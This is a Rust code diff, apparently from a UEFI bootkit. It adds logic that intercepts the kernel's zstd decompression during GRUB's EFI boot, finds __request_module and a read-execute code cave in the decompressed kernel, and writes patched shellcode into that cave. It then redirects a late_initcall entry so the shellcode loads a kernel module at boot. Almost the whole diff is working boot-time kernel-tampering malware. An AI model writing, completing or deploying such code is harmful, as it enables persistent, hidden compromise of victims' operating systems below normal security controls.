@@ -1,10 +1,11 @@
 use log::{debug, error, info};
 
 use crate::helpers::{
-    file_helper::{Permissions, cave_finder},
+    file_helper::{cave_finder, Permissions},
     memory_helper::{
-        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
-        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+        binary_search, get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+        translate_physical_to_virtual, InitcallPhase, InlineHook, INLINE_HOOK_SIZE,
+        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
     },
 };
 
@@ -19,6 +20,11 @@ pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
     hook: 0,
     original_bytes: [0; INLINE_HOOK_SIZE],
 };
+
+const REQUEST_MODULE_DISTANCE: u8 = 0x45;
+const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
+const REQUEST_MODULE_SENTINEL: u64 = 0xDEADBEEFDEADBEEF;
+const ORIGINAL_FN_SENTINEL: u64 = 0xCAFEBABECAFEBABE;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -175,19 +181,25 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         dst, dst_capacity
     );
 
-    // TODO: Deploy the kernel hook here to overwrite the pointer at the late_initcall slot with the address of our init function.
-    let late_initcall_addr =
+    // Deploy the kernel hook: overwrite the late_initcall slot to point at our
+    // shellcode in the code cave, which calls __request_module then tail-calls
+    // the original initcall target.
+    let initcall_info =
         match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
-            Some(addr) => addr,
+            Some(info) => info,
             None => {
                 error!("Failed to find late_initcall address in kernel");
                 return ret_val;
             }
         };
-    debug!("Found late_initcall at address: {:#x}", late_initcall_addr);
+    debug!(
+        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
+        initcall_info.entry_physical_address, initcall_info.entry_virtual_address, initcall_info.original_target_virtual_address
+    );
+
     let code_cave = match cave_finder(
         dst,
-        dst_capacity,   
+        dst_capacity,
         0x1000,
         Permissions::READ | Permissions::EXECUTE,
     ) {
@@ -198,5 +210,102 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         }
     };
     debug!("Found suitable code cave at address: {:#x}", code_cave);
+
+    // Locate __request_module in the decompressed kernel.
+    let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find __request_module in kernel");
+            return ret_val;
+        }
+    };
+    request_module_phys -= REQUEST_MODULE_DISTANCE as usize;
+
+    // Translate physical addresses to kernel virtual addresses for the shellcode.
+    let request_module_virt =
+        match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
+            Some(addr) => addr,
+            None => {
+                error!("Failed to translate __request_module to virtual address");
+                return ret_val;
+            }
+        };
+    debug!(
+        "__request_module: phys={:#x}, virt={:#x}",
+        request_module_phys, request_module_virt
+    );
+
+    let code_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, code_cave) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to translate code cave to virtual address");
+            return ret_val;
+        }
+    };
+    debug!(
+        "Code cave: phys={:#x}, virt={:#x}",
+        code_cave, code_cave_virt
+    );
+
+    // Load the pre-assembled shellcode blob and patch the sentinel values.
+    let shellcode_template: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
+    let mut shellcode = [0u8; 512];
+    let shellcode_len = shellcode_template.len();
+    shellcode[..shellcode_len].copy_from_slice(shellcode_template);
+
+    // Patch 0xDEADBEEFDEADBEEF -> __request_module virtual address.
+    let sentinel_bytes = REQUEST_MODULE_SENTINEL.to_le_bytes();
+    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
+        shellcode[offset..offset + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
+    } else {
+        error!("Failed to find request_module sentinel in shellcode");
+        return ret_val;
+    }
+
+    // Patch 0xCAFEBABECAFEBABE -> original initcall target virtual address.
+    let sentinel_bytes = ORIGINAL_FN_SENTINEL.to_le_bytes();
+    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
+        shellcode[offset..offset + 8]
+            .copy_from_slice(&(initcall_info.original_target_virtual_address as u64).to_le_bytes());
+    } else {
+        error!("Failed to find original_fn sentinel in shellcode");
+        return ret_val;
+    }
+
+    // Write the patched shellcode into the code cave.
+    unsafe {
+        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), code_cave as *mut u8, shellcode_len);
+    }
+    debug!(
+        "Wrote {} bytes of shellcode to code cave at {:#x}",
+        shellcode_len, code_cave
+    );
+
+    // Overwrite the last late_initcall prel32 entry to point at our shellcode.
+    let relative_offset =
+        (code_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
+    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
+        error!(
+            "Code cave too far from initcall entry for prel32: delta={:#x}",
+            relative_offset
+        );
+        return ret_val;
+    }
+    unsafe {
+        core::ptr::write(
+            initcall_info.entry_physical_address as *mut i32,
+            relative_offset as i32,
+        );
+    }
+    info!(
+        "Patched late_initcall entry at virt={:#x} (phys={:#x}) with prel32 offset {:#x} -> shellcode at virt={:#x}",
+        initcall_info.entry_virtual_address, initcall_info.entry_physical_address, relative_offset as i32, code_cave_virt
+    );
+
     ret_val
+}
+
+/// Finds the byte offset of an 8-byte sentinel value within a buffer.
+fn find_sentinel(buf: &[u8], sentinel: &[u8; 8]) -> Option<usize> {
+    buf.windows(8).position(|w| w == sentinel)
 }
